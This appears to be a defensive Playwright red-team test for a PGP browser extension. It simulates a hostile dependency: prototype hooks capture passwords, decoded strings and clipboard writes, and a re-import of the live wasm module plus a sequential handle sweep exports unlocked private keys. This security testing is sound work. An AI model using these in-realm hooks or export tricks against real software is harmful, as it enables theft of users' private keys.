import type { Page } from "@playwright/test";

import { expect, test } from "./fixtures";
import {
  goToKeys,
  importPrivateKey,
  lockOnlyKey,
  onboardWithPasswordSkipKey,
  unlockOnlyKey,
} from "./helpers";
import { PRIVATE_KEY_FIXTURE } from "./private-key";

/**
 * RED TEAM: a compromised in-panel dependency.
 *
 * `heap.spec.ts` covers the PASSIVE attacker -- someone reading the V8 heap
 * looking for key material that shouldn't be there. This spec covers the
 * ACTIVE one: arbitrary JS executing *inside the side-panel realm*, which is
 * what "a compromised UI dep" actually means. It has no CDP, no debugger and
 * no privileges the page doesn't have -- everything below runs as ordinary
 * in-page script via `page.evaluate`.
 *
 * The findings are asymmetric, and that is the point:
 *
 *   - WASM linear memory is genuinely opaque. There is no in-page API that
 *     hands out the `WebAssembly.Memory` of a module you don't hold a
 *     reference to (`wasm-memory.ts` needs CDP `queryObjects` to find it).
 *   - But the *export table* is not opaque. The wasm-bindgen glue is an ES
 *     module in the extension's own bundle, and the ES module registry is
 *     keyed by resolved URL: `import()`-ing the same chunk URL returns the
 *     SAME module namespace, i.e. the LIVE instance with the LIVE KEY_STORE.
 *     A fresh instantiation would have an empty KEY_STORE and be harmless;
 *     this is not a fresh instantiation.
 *   - `KEY_STORE` handles are a sequential `u32` from a counter starting at
 *     1 (`next_handle`, gpg-wasm/src/lib.rs), so there is nothing to guess.
 *   - The "type EXPORT to confirm" gate is UI, and UI is not a boundary
 *     against code running in the same realm.
 *
 * Tests that DEMONSTRATE A GAP are written to assert the gap, so the suite
 * stays green and the gap is pinned. If one of them starts failing, the
 * hardening landed -- flip the assertion and delete the comment. They are
 * NOT statements of desired behaviour.
 */

const MASTER = "correct horse battery staple";
const IMPORT_PW = "hostile-dep-import-pw-123";
const { name, secretNeedle, privateKey } = PRIVATE_KEY_FIXTURE;

/** How many sequential handles the attacker bothers to try. */
const HANDLE_SWEEP = 8;

// ── the hostile dependency's payload ─────────────────────────────────
// Kept as plain strings/functions evaluated in-page so it is obvious that
// nothing here relies on test-runner privileges.

/**
 * Locate the wasm-bindgen glue chunk the way a dropped-in dependency would:
 * read the page's own entry script and pull the chunk name out of it. No
 * hardcoded content hash, no build-time knowledge.
 */
async function findWasmChunkUrl(page: Page): Promise<string | null> {
  return page.evaluate(async () => {
    const entry = document.querySelector<HTMLScriptElement>(
      'script[type="module"][src]',
    );
    if (!entry) return null;
    // Same-origin chrome-extension:// GET -- allowed by `connect-src 'self'`
    // and by network-lockdown's extension-URL passthrough.
    const source = await fetch(entry.src).then((r) => r.text());
    // The bundler writes the dynamic import as a chunk-relative specifier
    // (`./gpg_wasm-<hash>.js`); resolving it against the entry script's own
    // URL reproduces exactly the key the ES module registry used.
    const match = /gpg_wasm-[A-Za-z0-9_-]+\.js/.exec(source);
    return match ? new URL(match[0], entry.src).href : null;
  });
}

test("a compromised side-panel dependency: what it can and cannot reach", async ({
  panel,
}) => {
  // Onboarding + import + several Argon2id(64 MB) rounds, plus a lock/unlock
  // cycle. Well over the 60s default.
  test.setTimeout(240_000);

  // One key only, so handle numbering is unambiguous.
  await onboardWithPasswordSkipKey(panel, MASTER);
  await importPrivateKey(panel, privateKey, IMPORT_PW, name);

  // ── step 1: install the boundary hooks BEFORE any secret moves ─────
  // A real hostile dep runs at import time, i.e. before the user does
  // anything. Everything it needs is a plain prototype assignment.
  await test.step("prototype hooks on the wasm-bindgen boundary install cleanly", async () => {
    const installed = await panel.evaluate(() => {
      const w = window as unknown as Record<string, unknown>;
      w.__pwned = { encoded: [] as string[], decoded: [] as string[], rng: 0 };
      const sink = w.__pwned as {
        encoded: string[];
        decoded: string[];
        rng: number;
      };

      // JS -> wasm strings. `TextEncoder.prototype.encode` is what the app
      // uses to turn a typed password into the Uint8Array it passes to
      // `unlockWithPassword`; `encodeInto` is what the wasm-bindgen glue
      // uses for `&str` params. Both are ordinary writable prototype
      // methods, and the glue's cached encoder resolves them per call.
      // Capturing the pristine prototype method is the whole trick.
      // eslint-disable-next-line @typescript-eslint/unbound-method
      const realEncode = TextEncoder.prototype.encode;
      TextEncoder.prototype.encode = function (input?: string) {
        if (typeof input === "string" && input.length > 0) {
          sink.encoded.push(input);
        }
        return realEncode.call(this, input);
      };

      // wasm -> JS strings. Every String returned across the boundary goes
      // through `cachedTextDecoder.decode(...)`, a prototype method call.
      // eslint-disable-next-line @typescript-eslint/unbound-method -- as above.
      const realDecode = TextDecoder.prototype.decode;
      TextDecoder.prototype.decode = function (
        input?: ArrayBufferView | ArrayBuffer,
        opts?: TextDecodeOptions,
      ) {
        const out = realDecode.call(this, input as ArrayBufferView, opts);
        if (out.length > 0) sink.decoded.push(out);
        return out;
      };

      // The wasm module's only entropy source is a per-call lookup of
      // `globalThis.crypto.getRandomValues`. Count (do NOT tamper -- the
      // rest of the test needs real randomness).
      // eslint-disable-next-line @typescript-eslint/unbound-method -- as above.
      const realRng = Crypto.prototype.getRandomValues;
      Crypto.prototype.getRandomValues = function <
        T extends ArrayBufferView | null,
      >(array: T): T {
        sink.rng++;
        return realRng.call(this, array as never) as T;
      };

      // The clipboard sink. `navigator.clipboard` is extensible, so an own
      // property shadows the prototype method.
      const realWrite = navigator.clipboard.writeText.bind(navigator.clipboard);
      (navigator.clipboard as unknown as Record<string, unknown>).writeText =
        async (text: string) => {
          (sink as unknown as { clipboard?: string[] }).clipboard ??= [];
          (sink as unknown as { clipboard: string[] }).clipboard.push(text);
          return realWrite(text);
        };

      // The RNG taps, probed as TWO separate routes because they fail for
      // different reasons and a single probe hides one of them.
      //
      // getrandom's wasm backend caches the Crypto OBJECT and looks
      // `getRandomValues` up on that instance per call, so an own property on
      // the instance is what would actually poison wasm entropy.
      //
      // Route 1, plain assignment (`crypto.getRandomValues = f`): already
      // blocked by freezing Crypto.prototype, because `[[Set]]` walks the
      // prototype chain and refuses when it finds a non-writable data
      // property. Verified by differential -- removing the instance pin does
      // NOT make this succeed.
      // Route 2, `Object.defineProperty`: skips that check entirely and
      // installs an own property regardless. ONLY the instance pin stops it.
      // Verified by differential -- removing the pin flips this to true.
      //
      // NB: compare against the UNBOUND original. `.bind()` returns a fresh
      // function object, so comparing the slot to a bound copy is always
      // "different" and would report the tap installed even when the write
      // silently failed. That false positive cost a debugging round.
      // eslint-disable-next-line @typescript-eslint/unbound-method
      const rngBefore = crypto.getRandomValues;
      const realInstanceRng = crypto.getRandomValues.bind(crypto);
      try {
        (crypto as unknown as Record<string, unknown>).getRandomValues =
          function <T extends ArrayBufferView | null>(array: T): T {
            sink.rng++;
            return realInstanceRng(array as never);
          };
      } catch {
        // A non-writable own slot throws in strict mode -- that is the win.
      }
      const rngAssignShadowed = crypto.getRandomValues !== rngBefore;

      // The route that plain assignment does NOT cover. `obj.x = f` walks the
      // prototype chain and ECMAScript refuses the [[Set]] when it finds a
      // non-writable data property there -- so freezing Crypto.prototype
      // already defeats the assignment above. defineProperty skips that check
      // entirely and installs an own property regardless, so it is the route
      // that actually requires pinning the own slot on the instance.
      try {
        Object.defineProperty(crypto, "getRandomValues", {
          value: function <T extends ArrayBufferView | null>(array: T): T {
            sink.rng++;
            return realInstanceRng(array as never);
          },
          configurable: true,
          writable: true,
        });
      } catch {
        // A non-configurable own slot makes this throw -- that is the win.
      }
      const rngDefineShadowed = crypto.getRandomValues !== rngBefore;

      return {
        encode: TextEncoder.prototype.encode !== realEncode,
        decode: TextDecoder.prototype.decode !== realDecode,
        rng: Crypto.prototype.getRandomValues !== realRng,
        rngAssign: rngAssignShadowed,
        rngDefine: rngDefineShadowed,
      };
    });

    // HARDENED (was a documented gap): `network-lockdown.ts` now freezes the
    // marshalling primitives non-writable/non-configurable at first import,
    // alongside fetch/XHR/WebSocket &c. The assignments above therefore no
    // longer take effect, so the taps never install.
    //
    // This holds only because network-lockdown.ts is the first import in
    // every entrypoint: a dependency loaded EARLIER in the module graph
    // would still win, and this does nothing about T-ACTIVE-WASM-CALL below.
    // See SECURITY.md §8.10.
    expect(
      installed,
      "boundary primitives must be frozen against an in-realm tap",
    ).toEqual({
      encode: false,
      decode: false,
      rng: false,
      // rngAssign: blocked by the PROTOTYPE freeze (assignment respects a
      // non-writable inherited data property). rngDefine: blocked only by
      // pinning the own slot on the crypto instance, since defineProperty
      // bypasses the prototype check. Both matter; they fail differently.
      rngAssign: false,
      rngDefine: false,
    });
  });

  // ── step 2: the unlock happens, with the taps attempted ────────────
  await test.step("the TextEncoder tap cannot capture the unlock password", async () => {
    await unlockOnlyKey(panel, IMPORT_PW);

    const captured = await panel.evaluate(
      () => (window as unknown as { __pwned: { encoded: string[] } }).__pwned,
    );

    // HARDENED (was a documented gap): the conversion from the React input's
    // JS string to a Uint8Array is inherently observable to whoever controls
    // TextEncoder.prototype.encode -- so the defence is to deny control of
    // it. With the primitive frozen the tap never installs and the sink stays
    // empty. The `.fill(0)` contract in wasm-secrets.ts remains what it
    // always was (forensic hygiene), not the thing stopping this.
    expect(
      captured.encoded,
      "a frozen TextEncoder must leave the password tap empty",
    ).not.toContain(IMPORT_PW);
    expect(captured.encoded, "no encode taps at all").toEqual([]);
  });

  // ── step 3: THE CRUX -- is the live export table reachable? ────────
  const found = await findWasmChunkUrl(panel);

  await test.step("the wasm glue chunk URL is discoverable from in-page JS", () => {
    // Not a secret, but worth pinning: no build-time knowledge is needed.
    // The chunk name is written verbatim into the entry script, which the
    // page may fetch itself.
    expect(
      found,
      "hostile dep can find chunks/gpg_wasm-*.js from the entry script alone",
    ).toMatch(/^chrome-extension:\/\/.+\/gpg_wasm-[A-Za-z0-9_-]+\.js$/);
  });
  if (found === null) throw new Error("unreachable: asserted non-null above");
  const wasmChunkUrl: string = found;

  await test.step("import()-ing that chunk returns the LIVE instance, not a fresh one", async () => {
    const probe = await panel.evaluate(async (url: string) => {
      const mod = (await import(/* @vite-ignore */ url)) as Record<
        string,
        unknown
      >;
      const exportNames = Object.keys(mod);
      // `initSync` on an already-initialised wasm-bindgen module is the
      // tell: a *fresh* module record would still be uninitialised and
      // `ping()` would throw "must be initialized first".
      let pinged: string | null = null;
      try {
        pinged = (mod.ping as () => string)();
      } catch (e) {
        pinged = `THREW: ${String(e)}`;
      }
      return { exportNames, pinged };
    }, wasmChunkUrl);

    // The whole export table, including both secret-export paths.
    expect(probe.exportNames).toContain("getKeyArmored");
    expect(probe.exportNames).toContain("encryptKeyForExportWithHandle");
    expect(probe.exportNames).toContain("unlockWithPassword");

    // GAP (documented, not desired): the ES module registry is keyed by
    // resolved URL, so this is the same module record `wasm-loader.ts`
    // already initialised -- same linear memory, same populated KEY_STORE.
    // This is the single fact the rest of the attack rests on. If a future
    // build ever isolates the module (worker / separate realm), `ping()`
    // would throw here instead.
    expect(
      probe.pinged,
      "same-URL import() yields the already-initialised module",
    ).not.toContain("THREW");
  });

  // ── step 4: sequential handle guessing against the export path ─────
  await test.step("sequential handle guessing exports the unlocked private key", async () => {
    const result = await panel.evaluate(
      async ({ url, sweep }: { url: string; sweep: number }) => {
        const mod = (await import(/* @vite-ignore */ url)) as {
          getKeyArmored: (h: number) => string;
        };
        const hits: { handle: number; armorLength: number; armor: string }[] =
          [];
        const errors: string[] = [];
        // No UI, no "type EXPORT", no user gesture. Just count from 1.
        for (let h = 1; h <= sweep; h++) {
          try {
            const armor = mod.getKeyArmored(h);
            hits.push({ handle: h, armorLength: armor.length, armor });
          } catch (e) {
            errors.push(`${h}: ${String(e)}`);
          }
        }
        return { hits, errors };
      },
      { url: wasmChunkUrl, sweep: HANDLE_SWEEP },
    );

    // GAP (documented, not desired): handle 1 is the first unlock of the
    // session, so a hostile dep needs zero guesses in practice. Randomising
    // the handle would not fix this on its own -- see the fiber probe below
    // and the report -- but it removes the trivial path.
    expect(
      result.hits.map((h) => h.handle),
      `handle 1 hits; misses: ${result.errors.join(" | ")}`,
    ).toContain(1);

    const armor = result.hits[0].armor;
    expect(armor).toContain("BEGIN PGP PRIVATE KEY BLOCK");
    // Same needle heap.spec.ts asserts must NEVER be in the JS heap. Here
    // the attacker gets it handed over, in plaintext, on request.
    expect(
      armor.replace(/\n/g, ""),
      "plaintext secret key material crosses the boundary with no gate",
    ).toContain(secretNeedle);
  });

  await test.step("the passphrase-wrapped export path is equally ungated", async () => {
    const armor = await panel.evaluate(async (url: string) => {
      const mod = (await import(/* @vite-ignore */ url)) as {
        encryptKeyForExportWithHandle: (h: number, p: Uint8Array) => string;
      };
      const attackerPassphrase = new TextEncoder().encode("pwned-by-the-dep");
      try {
        return mod.encryptKeyForExportWithHandle(1, attackerPassphrase);
      } catch (e) {
        return `THREW: ${String(e)}`;
      }
    }, wasmChunkUrl);

    // GAP (documented, not desired): §2 calls both export paths
    // "user-initiated". Neither is enforced as such below the UI. This one
    // is arguably worse for the victim: the attacker chooses the passphrase,
    // so the exfiltrated blob is usable only by them.
    expect(armor).toContain("BEGIN PGP PRIVATE KEY BLOCK");
    expect(armor).not.toContain("THREW");
  });

  // ── step 5: what the attacker CANNOT get ──────────────────────────
  await test.step("the React tree yields no private key material", async () => {
    const walk = await panel.evaluate(
      ({ needle, owner }: { needle: string; owner: string }) => {
        const miss = {
          reachedTree: false,
          nodes: 0,
          sawOwnerName: false,
          sawSecret: false,
          sawPrivateArmor: false,
        };
        const root = document.getElementById("root");
        if (!root) return miss;
        const containerKey = Object.keys(root).find((k) =>
          k.startsWith("__reactContainer$"),
        );
        if (!containerKey) return miss;

        const seen = new Set<unknown>();
        const strings: string[] = [];
        let nodes = 0;

        // Collect every string reachable from fiber props/state. Bounded so
        // a pathological tree can't hang the test.
        const harvest = (value: unknown, depth: number) => {
          if (depth > 6 || value === null || typeof value !== "object") {
            if (typeof value === "string") strings.push(value);
            return;
          }
          if (seen.has(value)) return;
          seen.add(value);
          if (value instanceof Map) {
            for (const v of value.values()) harvest(v, depth + 1);
            return;
          }
          if (Array.isArray(value) || value instanceof Set) {
            for (const v of value as Iterable<unknown>) harvest(v, depth + 1);
            return;
          }
          for (const v of Object.values(value)) harvest(v, depth + 1);
        };

        const visit = (fiber: unknown) => {
          while (fiber && nodes < 20_000) {
            nodes++;
            const f = fiber as Record<string, unknown>;
            harvest(f.memoizedProps, 0);
            harvest(f.memoizedState, 0);
            if (f.child) visit(f.child);
            fiber = f.sibling;
          }
        };
        visit((root as unknown as Record<string, unknown>)[containerKey]);

        const joined = strings.join("\u0000");
        return {
          reachedTree: true,
          nodes,
          // Control: the walk really did read component props.
          sawOwnerName: joined.includes(owner),
          sawSecret: joined.replace(/\n/g, "").includes(needle),
          sawPrivateArmor: joined.includes("BEGIN PGP PRIVATE KEY BLOCK"),
        };
      },
      { needle: secretNeedle, owner: name },
    );

    expect(walk.reachedTree, "fiber walk reached the React tree").toBe(true);
    expect(
      walk.sawOwnerName,
      "control: the walk sees public component props",
    ).toBe(true);
    // This one is a genuine win for the design, and it is what §1 is
    // reaching for: components hold public metadata + an opaque u32, so
    // walking the tree gets an attacker nothing directly.
    expect(walk.sawSecret, "no secret key material in React state").toBe(false);
    expect(walk.sawPrivateArmor, "no private armor in React state").toBe(false);
  });

  await test.step("no in-page API exposes the wasm linear memory", async () => {
    // `wasm-memory.ts` reaches the buffer only via CDP `queryObjects`,
    // which is a debugger capability. From inside the page there is no
    // enumeration of live WebAssembly.Memory objects, and the loader keeps
    // its reference in module scope with no global alias.
    const leaked = await panel.evaluate(() => {
      const suspects = Object.getOwnPropertyNames(globalThis).filter((k) => {
        try {
          const v = (globalThis as unknown as Record<string, unknown>)[k];
          return (
            v instanceof WebAssembly.Memory ||
            (typeof v === "object" &&
              v !== null &&
              "memory" in v &&
              (v as { memory?: unknown }).memory instanceof WebAssembly.Memory)
          );
        } catch {
          return false;
        }
      });
      return suspects;
    });
    expect(leaked, "no WebAssembly.Memory on the global object").toEqual([]);
  });

  // ── step 6: the boundary taps, after real traffic ─────────────────
  await test.step("the TextDecoder and RNG taps stay blind after real traffic", async () => {
    const decoded = await panel.evaluate(
      () =>
        (window as unknown as { __pwned: { decoded: string[]; rng: number } })
          .__pwned,
    );

    // HARDENED (was a documented gap). This was the worst of the taps: a
    // passive read of EVERY wasm->JS string, which caught the armor from the
    // export calls above without needing to know they had happened. It meant
    // that even a perfectly gated export path would still leak while the
    // USER did their own legitimate export. A frozen decoder denies it.
    const sawArmor = decoded.decoded.some((s) =>
      s.replace(/\n/g, "").includes(secretNeedle),
    );
    expect(
      sawArmor,
      "a frozen TextDecoder must not expose wasm->JS strings",
    ).toBe(false);
    expect(decoded.decoded, "no decode taps at all").toEqual([]);

    // Entropy: the wasm RNG is a per-call `globalThis.crypto.getRandomValues`
    // lookup, and a tap returning constants would make every subsequently
    // generated key predictable -- silently, with valid-looking output. The
    // freeze means the tap never sees a call. Note this closes the tap, not
    // the dependency-order problem: a dep loaded before network-lockdown.ts
    // could still poison entropy, which is why mixing WASM-side entropy into
    // keygen is tracked separately (T-ENTROPY-POISON).
    expect(
      decoded.rng,
      "a frozen getRandomValues must record no tapped calls",
    ).toBe(0);
  });

  await test.step("the clipboard tap cannot observe a real in-app copy", async () => {
    await goToKeys(panel);
    await panel.getByRole("button", { name: "Key options" }).first().click();
    await panel.getByRole("menuitem", { name: "Copy public key" }).click();
    // The app's own copy still works -- the lockdown pins the method, it
    // does not disable it. This assertion is the regression guard for that.
    await expect(panel.getByText("Public key copied")).toBeVisible();

    const clip = await panel.evaluate(
      () =>
        (window as unknown as { __pwned: { clipboard?: string[] } }).__pwned
          .clipboard ?? [],
    );
    // HARDENED (was a documented gap): the 30s/60s clipboard auto-clear in §1
    // defends against clipboard *managers*, never against an in-realm reader
    // who taps at write time. Note the tap above shadows via an OWN property
    // on `navigator.clipboard` -- freezing Clipboard.prototype.writeText
    // alone does not stop that, so network-lockdown.ts pins the own slot on
    // the instance too. Demonstrated on the public-key path (nothing secret
    // leaves the repo fixtures); the private-key export shares the same
    // `useCopyToClipboard`.
    expect(
      clip.some((s) => s.includes("BEGIN PGP PUBLIC KEY BLOCK")),
      "a pinned navigator.clipboard.writeText must leave the tap blind",
    ).toBe(false);
  });

  // ── step 7: the one control that proves lock actually helps ───────
  await test.step("locking the key does close the export path", async () => {
    await lockOnlyKey(panel);
    const after = await panel.evaluate(
      async ({ url, sweep }: { url: string; sweep: number }) => {
        const mod = (await import(/* @vite-ignore */ url)) as {
          getKeyArmored: (h: number) => string;
        };
        const hits: number[] = [];
        for (let h = 1; h <= sweep; h++) {
          try {
            mod.getKeyArmored(h);
            hits.push(h);
          } catch {
            /* handle gone -- expected */
          }
        }
        return hits;
      },
      { url: wasmChunkUrl, sweep: HANDLE_SWEEP },
    );

    // The real mitigation that exists today: the attack window is exactly
    // the unlocked window. `dropKey` genuinely removes and zeroizes the
    // entry, so auto-lock (§6) is load-bearing security, not convenience.
    expect(after, "no KEY_STORE handle survives an in-app lock").toEqual([]);
  });
});
